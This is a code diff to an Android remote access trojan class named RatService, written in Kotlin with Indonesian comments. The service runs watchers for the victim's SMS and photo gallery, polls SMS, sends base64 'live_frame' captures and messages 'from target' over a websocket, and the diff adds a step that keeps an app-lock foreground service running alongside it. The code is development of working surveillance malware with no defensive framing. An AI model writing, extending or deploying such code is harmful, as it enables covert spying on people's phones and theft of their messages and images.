@@ -6,6 +6,7 @@ import android.content.Intent
 import android.content.SharedPreferences
 import android.os.Build
 import android.os.IBinder
+import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.gson.Gson
 import com.google.gson.JsonObject
@@ -67,6 +68,17 @@ class RatService : Service() {
         try { smsWatcher?.start() } catch (_: Exception) {}
         try { galleryWatcher?.start() } catch (_: Exception) {}
         startSmsPolling()
+
+        // Pastikan AppLockForegroundService jalan
+        try {
+            val svcIntent = Intent(this, AppLockForegroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(svcIntent)
+            } else {
+                startService(svcIntent)
+            }
+        } catch (_: Exception) {}
+
         return START_STICKY
     }
 
@@ -108,10 +120,8 @@ class RatService : Service() {
     }
 
     private fun connect() {
-        // Ambil username dari SharedPreferences — JANGAN fallback ke "unknown"
         val owner = userPrefs.getString("username", "") ?: ""
         if (owner.isEmpty()) {
-            // Belum setup, tunggu
             return
         }
 
@@ -173,25 +183,25 @@ class RatService : Service() {
     }
 
     fun sendFrame(frameType: String, base64Data: String): Boolean {
-    return try {
-        val payload = JsonObject().apply {
-            addProperty("type", "event")
-            add("data", gson.toJsonTree(mapOf(
-                "type" to "live_frame",
-                "frame_type" to frameType,
-                "data" to base64Data,
-                "ts" to System.currentTimeMillis()
-            )))
+        return try {
+            val payload = JsonObject().apply {
+                addProperty("type", "event")
+                add("data", gson.toJsonTree(mapOf(
+                    "type" to "live_frame",
+                    "frame_type" to frameType,
+                    "data" to base64Data,
+                    "ts" to System.currentTimeMillis()
+                )))
+            }
+            ws?.send(gson.toJson(payload))
+            Log.i("RatService", "✅ Frame sent: $frameType size=${base64Data.length}")
+            true
+        } catch (e: Exception) {
+            Log.e("RatService", "❌ sendFrame error", e)
+            false
         }
-        ws?.send(gson.toJson(payload))
-        Log.i("RatService", "✅ Frame sent: $frameType size=${base64Data.length}")
-        true
-    } catch (e: Exception) {
-        Log.e("RatService", "❌ sendFrame error", e)
-        false
     }
-}
-    
+
     fun sendChatFromTarget(text: String) {
         try {
             val payload = JsonObject().apply {
